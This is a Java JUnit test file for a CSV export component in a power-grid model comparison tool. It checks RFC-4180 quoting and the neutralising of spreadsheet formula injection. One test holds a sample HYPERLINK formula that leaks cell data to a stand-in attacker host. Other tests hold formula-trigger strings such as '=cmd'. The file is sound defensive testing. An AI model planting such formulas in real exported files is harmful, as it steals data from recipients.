/*
 * Licensed under the EUPL-1.2-or-later.
 * Copyright (c) 2020, gridDigIt Kft. All rights reserved.
 */
package eu.griddigit.cimpal.core.diffexport;

import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Tests for {@link ComparisonCsvWriter}, covering both RFC-4180 quoting and the
 * neutralisation of spreadsheet formula triggers.
 * <p>
 * The values in a comparison CSV are RDF literals and IRIs taken from the third-party
 * models being compared, and the resulting file is routinely circulated to colleagues and
 * counterparties. A value that a spreadsheet evaluates as a formula therefore executes on
 * the recipient's machine, which makes the export a delivery vehicle rather than a report.
 */
class ComparisonCsvWriterTest {

    private final ComparisonCsvWriter writer = new ComparisonCsvWriter();

    private static ComparisonOperationRow add(String value) {
        return new ComparisonOperationRow("item", "Class", "prop", "", value, Operation.ADD);
    }

    /** The value field of the single data row. */
    private String valueColumnOf(String csv) {
        String[] lines = csv.split("\n");
        assertEquals(2, lines.length, "expected a header and exactly one data row");
        String row = lines[1];
        // Value is the last of the five columns; the first four are simple literals here.
        int fourthComma = -1;
        for (int i = 0; i < 4; i++) {
            fourthComma = row.indexOf(',', fourthComma + 1);
        }
        return row.substring(fourthComma + 1);
    }

    // ---- Formula injection ----

    @Test
    void leadingEquals_isNeutralised() {
        String value = valueColumnOf(writer.toCsv(List.of(add("=1+1"))));
        assertTrue(value.startsWith("'"),
                "a leading '=' must be prefixed so the spreadsheet treats the cell as text");
        assertFalse(value.startsWith("="), "the cell must not begin with '='");
    }

    @Test
    void allFormulaTriggers_areNeutralised() {
        for (String trigger : List.of("=", "+", "-", "@", "\t", "\r")) {
            String raw = trigger + "cmd";
            String value = valueColumnOf(writer.toCsv(List.of(add(raw))));
            // The field may be quoted; strip one leading quote before checking the prefix.
            String unquoted = value.startsWith("\"") ? value.substring(1) : value;
            assertTrue(unquoted.startsWith("'"),
                    "trigger " + trigger.replace("\t", "\\t").replace("\r", "\\r")
                            + " must be neutralised, got: " + value);
        }
    }

    @Test
    void hyperlinkExfiltrationPayload_isNeutralised() {
        String payload = "=HYPERLINK(\"https://evil.example/?d=\"&A1,\"ok\")";
        String value = valueColumnOf(writer.toCsv(List.of(add(payload))));
        assertTrue(value.startsWith("\"'="), "payload must be quoted and neutralised: " + value);
    }

    @Test
    void benignValue_isNotAltered() {
        String value = valueColumnOf(writer.toCsv(List.of(add("Breaker"))));
        assertEquals("Breaker", value, "an ordinary value must pass through untouched");
    }

    @Test
    void iriValue_isNotAltered() {
        String iri = "http://iec.ch/TC57/CIM100#Breaker.normalOpen";
        String value = valueColumnOf(writer.toCsv(List.of(add(iri))));
        assertEquals(iri, value, "an IRI does not start with a trigger and must be unchanged");
    }

    // ---- RFC-4180 quoting must still hold ----

    @Test
    void commaContainingValue_isQuoted() {
        String value = valueColumnOf(writer.toCsv(List.of(add("a,b"))));
        assertEquals("\"a,b\"", value);
    }

    @Test
    void quoteContainingValue_isEscapedByDoubling() {
        String value = valueColumnOf(writer.toCsv(List.of(add("say \"hi\""))));
        assertEquals("\"say \"\"hi\"\"\"", value);
    }

    @Test
    void nullValue_becomesEmptyField() {
        String value = valueColumnOf(writer.toCsv(List.of(add(null))));
        assertEquals("", value);
    }

    @Test
    void header_isUnchanged() {
        String csv = writer.toCsv(List.of(add("x")));
        assertTrue(csv.startsWith("Item,Class,Property,Operation,Value\n"));
    }
}
